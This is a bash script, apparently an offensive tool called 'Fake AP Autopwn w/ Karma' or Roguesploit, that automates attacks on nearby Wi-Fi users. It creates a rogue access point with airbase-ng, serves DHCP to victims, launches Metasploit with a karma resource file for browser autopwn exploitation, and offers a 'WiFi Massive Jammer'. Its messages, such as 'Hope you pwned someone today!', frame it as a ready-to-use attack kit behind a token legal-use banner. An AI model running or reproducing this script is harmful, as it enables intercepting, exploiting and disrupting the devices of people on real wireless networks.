#!/bin/bash
##############################################################################################################
#                                     FAKE AP AUTOPWN w/ KARMA                                               #
#                                        by _B4ckp0r7                                                        #
#This is a simple script for creating a fake access point with                                               #
#dhcpd configuration, dns redirections, sniffing and browser_autopwn1 (i'll upgrade to 2nd soon)             #
##############################################################################################################

#colors
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'



#Checking
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 33 84 > /dev/null
service apache2 stop
clear



###################################################
# CTRL C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"--<[!] (Ctrl + C ) Detected, Trying To Exit... [!]>--"
sleep 1
echo ""
echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
sleep 1
echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
exit
}



#WARNING !!!
clear
echo -e $red" Loading the world..."
sleep 2
echo -e $red""
echo " =================================================================="
echo "|     PLEASE USE ONLY FOR LEGAL | AUTHORIZED | STUDY PURPOSES      |"
echo " =================================================================="
echo ""
echo -n "Press any key to continue .............."
read warning

autopwning () {
	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
	touch /var/lib/dhcp/dhcpd.leases
	dhcpd -cf dhcpd.conf at0
	msfconsole -q -r $(pwd)/karma.rc
}

#menu1
menu () {
clear
echo -e $yellow"--<"$blue"[*]"$yellow" Roguesploit -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
echo -e $lightgreen"--<[?] What do you want to do? [?]>-- ";
echo -e $lightgreen"       1. Start RogueAP"
echo -e $lightgreen"       2. Start Pwning Services"
echo -e $lightgreen"       3. Start WiFi Massive Jammer"
echo -e $lightgreen"       4. Credits"
echo -e $lightgreen"       5. Exit"
echo -ne $yellow"root@B4ckp0r7:"; read answer1

if test $answer1 == '1'
	then
	echo -e $yellow"Starting RogueAP"
	echo -ne $green"Choose a name for your AP:" ;tput sgr0
	read nameap
	sleep 1
	echo -e $red"[!] YOU NEED WLAN1 INTERFACE FOR THESE [!]"
	sleep 1
	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
	sleep 2
	sudo airmon-ng start wlan1
	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1mon
	menu
elif test $answer1 == '2'
	then
	clear
	autopwning
	menu
elif test $answer1 == '3'
	then
	xterm -title "Wifi Massive Jammer" -fa monaco -bg black -e "./wifijammer.py"
	menu	
elif test $answer1 == '4'
	then
	echo -e "Made by B4ckP0r7 with love, Italian Engeering"
	echo -e $blue"   Big thanks to:"
	echo -e $red"--<[ My friends ]>--"
	echo -e $green"--<[ QuantumSec ]>--"
	echo -e $white"--<[ And averyone who ever supported me ]>--"
	echo -e $blue" Press any key to continue... "
	read continuee
	menu
elif test $answer1 == '5'
	then
	clear
	pkill dnsmasq
	pkill dhcpd
	pkill airmon-ng
	pkill airbase-ng
	ifconfig at0 down
	echo -e $red"Goodbye.."
	sleep 2
	clear
	exit
else
		echo -e $red"[!]  Incorrect Number  [!]"
		echo -n -e $yellow"  Do you want exit? ( Yes / No ) :"
		read back
		if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'No' ]
			then
			echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
			pkill dhcpd
			pkill airmon-ng
			pkill airbase-ng
			ifconfig at0 down
			sleep 1
			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
			echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
			sleep 2
			clear
			exit
		elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'Yes' ]
			then
			menu
		fi
fi
}
#menu2
clear
echo -e $yellow"--<"$blue"[*]"$yellow" Roguesploit -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
echo -e $red"[!] YOU MUST HAVE ALL REQUIREMENTS FOR THIS SCRIPT [!]"
echo -e $lightgreen"--<[?] What do you want to do? [?]>-- "
echo -e $lightgreen"       1. Start RogueAP"
echo -e $lightgreen"       2. Start Pwning Services"
echo -e $lightgreen"       3. Start WiFi Massive Jammer"
echo -e $lightgreen"       4. Credits"
echo -e $lightgreen"       5. Exit"
echo -ne $yellow"root@B4ckp0r7:"; read answer1

if test $answer1 == '1'
	then
	echo -e $yellow"Starting RogueAP"
	echo -ne $green"Choose a name for your AP:" ;tput sgr0
	read nameap
	sleep 1
	echo -e $red"[!] YOU NEED WLAN1 INTERFACE FOR THESE [!]"
	sleep 1
	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
	sleep 2
	sudo airmon-ng start wlan1
	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1mon
	menu
elif test $answer1 == '2'
	then
	clear
	autopwning
	menu
elif test $answer1 == '3'
	then
	xterm -title "Wifi Massive Jammer" -fa monaco -bg black -e "./wifijammer.py"
	menu	
elif test $answer1 == '4'
	then
	echo -e "Made by B4ckP0r7 with love, Italian Engeering"
	echo -e $blue"   Big thanks to:"
	echo -e $red"--<[ My friends ]>--"
	echo -e $green"--<[ QuantumSec ]>--"
	echo -e $white"--<[ And averyone who ever supported me ]>--"
	echo -e $blue" Press any key to continue... "
	read continuee
	menu
elif test $answer1 == '5'
	then
	clear
	pkill dhcpd
	pkill airmon-ng
	pkill airbase-ng
	ifconfig at0 down
	echo -e $red"Goodbye.."
	sleep 2
	clear
	exit
else
		echo -e $red"[!]  Incorrect Number  [!]"
		echo -n -e $yellow"  Do you want exit? ( Yes / No ) :"
		read back
		if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'No' ]
			then
			echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
			pkill dhcpd
			pkill airmon-ng
			pkill airbase-ng
			ifconfig at0 down
			sleep 1
			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
			echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
			sleep 2
			clear
			exit
		elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'Yes' ]
			then
			menu
		fi
fi
